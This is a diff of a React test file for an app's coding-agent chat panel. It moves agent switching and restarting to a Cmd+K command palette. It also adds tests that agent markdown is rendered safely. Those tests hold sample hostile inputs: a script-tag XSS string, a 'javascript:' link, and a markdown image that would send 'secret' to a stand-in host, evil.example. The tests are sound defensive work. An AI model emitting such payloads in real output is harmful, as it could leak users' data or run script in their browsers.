@@ -11,6 +11,8 @@ async function start() {
   const user = userEvent.setup();
   render(<App api={server} />);
   await waitFor(() => expect(server.frameRequests.length).toBeGreaterThan(0));
+  // the inspector opens on Props; the scene tree is its Scene tab
+  await user.click(await screen.findByRole('tab', { name: 'Scene' }));
   await screen.findByTestId('scene-tree');
   return { server, user };
 }
@@ -50,7 +52,6 @@ describe('picking layers in the preview', () => {
   it('a dragged box picks the layers inside it, draws the box while dragging, and lists them as chips in the Agent tab', async () => {
     stubFrameRect();
     const { user } = await start();
-    await user.click(screen.getByRole('tab', { name: 'Agent' }));
     const preview = screen.getByTestId('preview');
     fireEvent.pointerDown(preview, { clientX: 0, clientY: 0, button: 0 });
     fireEvent.pointerMove(preview, { clientX: 300, clientY: 200 });
@@ -78,8 +79,6 @@ describe('the Agent tab', () => {
     const { server, user } = await start();
     const tree = await screen.findByTestId('scene-tree');
     await user.click(within(tree).getByTitle(/^title \(/));
-    await user.click(screen.getByRole('tab', { name: 'Agent' }));
-    await waitFor(() => expect(screen.getByRole('combobox', { name: 'Coding agent' })).toHaveTextContent('Fake agent'));
 
     await user.type(screen.getByLabelText('Message for the agent'), 'make it red');
     await user.click(screen.getByRole('button', { name: /Send/ }));
@@ -102,7 +101,6 @@ describe('the Agent tab', () => {
 
   it('shows edits compactly with file names, and permission requests as buttons that are never answered for the user', async () => {
     const { server, user } = await start();
-    await user.click(screen.getByRole('tab', { name: 'Agent' }));
     await say(server, { kind: 'tool', id: 't1', title: 'Edit scene.tsx', toolKind: 'edit', status: 'in_progress', files: ['src/scene.tsx'] });
     await say(server, { kind: 'tool', id: 't1', title: '', toolKind: 'edit', status: 'completed', files: [] });
     const tool = screen.getByTestId('chat-tool');
@@ -130,7 +128,6 @@ describe('the Agent tab', () => {
 
   it('says what went wrong in plain words', async () => {
     const { server, user } = await start();
-    await user.click(screen.getByRole('tab', { name: 'Agent' }));
     await say(server, { kind: 'error', message: 'The agent needs you to sign in first.' });
     expect(screen.getByRole('alert')).toHaveTextContent('sign in');
   });
@@ -139,12 +136,11 @@ describe('the Agent tab', () => {
     const server = new MockServer();
     server.agent = { presets: [], command: null, cwd: '/work' };
     render(<App api={server} />);
-    await userEvent.setup().click(await screen.findByRole('tab', { name: 'Agent' }));
     expect(await screen.findByText(/No coding agent was found/)).toBeInTheDocument();
     expect(screen.getByRole('button', { name: /Send/ })).toBeDisabled();
   });
 
-  it('chooses another agent from the list', async () => {
+  it('switches the agent from Cmd+K, and restarts it there too; the chat header has no picker', async () => {
     const server = new MockServer();
     server.agent = {
       presets: [
@@ -156,12 +152,50 @@ describe('the Agent tab', () => {
     };
     const user = userEvent.setup();
     render(<App api={server} />);
-    await user.click(await screen.findByRole('tab', { name: 'Agent' }));
-    const list = await screen.findByRole('combobox', { name: 'Coding agent' });
-    // the server tells every window which agent is in use when it connects
+    await screen.findByTestId('agent-panel');
+    expect(screen.queryByRole('combobox', { name: 'Coding agent' })).not.toBeInTheDocument();
     await act(() => server.send({ type: 'agent', event: { kind: 'status', status: 'idle', command: 'claude-cmd', image: false } }));
-    await waitFor(() => expect(within(list).getAllByRole('option')).toHaveLength(2));
-    await user.selectOptions(list, 'codex-cmd');
+    await user.keyboard('{Meta>}k{/Meta}');
+    await user.type(await screen.findByRole('combobox', { name: 'Command' }), 'switch agent');
+    await user.keyboard('{Enter}');
+    await user.click(await screen.findByRole('option', { name: 'Codex' }));
     expect(server.agentMessages.at(-1)).toEqual({ type: 'agent.select', command: 'codex-cmd' });
+
+    await user.keyboard('{Meta>}k{/Meta}');
+    await user.type(await screen.findByRole('combobox', { name: 'Command' }), 'restart agent');
+    await user.keyboard('{Enter}');
+    expect(server.agentMessages.at(-1)).toEqual({ type: 'agent.reset' });
+  });
+
+  it('renders the agent\'s markdown, and never raw HTML', async () => {
+    const { server } = await start();
+    await say(server, { kind: 'message', text: 'Did **bold** and `code`:\n\n- one\n- two <script>alert(1)</script>' });
+    const box = await screen.findByTestId('chat-agent');
+    await waitFor(() => expect(box.querySelector('[data-streamdown=strong]')).toHaveTextContent('bold'));
+    expect(box.querySelector('[data-streamdown=inline-code]')).toHaveTextContent('code');
+    expect(box.querySelectorAll('li')).toHaveLength(2);
+    expect(box.querySelector('script')).toBeNull();
+    expect(box).not.toHaveTextContent('**');
+  });
+
+  it('draws no remote image from agent markdown and makes no request for it', async () => {
+    const { server } = await start();
+    const loaded: string[] = [];
+    const original = HTMLImageElement.prototype.setAttribute;
+    HTMLImageElement.prototype.setAttribute = function (name: string, value: string) {
+      if (name === 'src') loaded.push(value);
+      return original.call(this, name, value);
+    };
+    try {
+      await say(server, { kind: 'message', text: 'Look: ![x](https://evil.example/?q=secret) and [a link](javascript:alert(1)) and [ok](https://example.com)' });
+      const box = await screen.findByTestId('chat-agent');
+      await waitFor(() => expect(box).toHaveTextContent('Look:'));
+      expect(box.querySelector('img')).toBeNull();
+      expect(box.innerHTML).not.toContain('evil.example');
+      expect(box.innerHTML).not.toContain('javascript:');
+      expect(loaded.filter((src) => src.includes('evil.example'))).toEqual([]);
+    } finally {
+      HTMLImageElement.prototype.setAttribute = original;
+    }
   });
 });
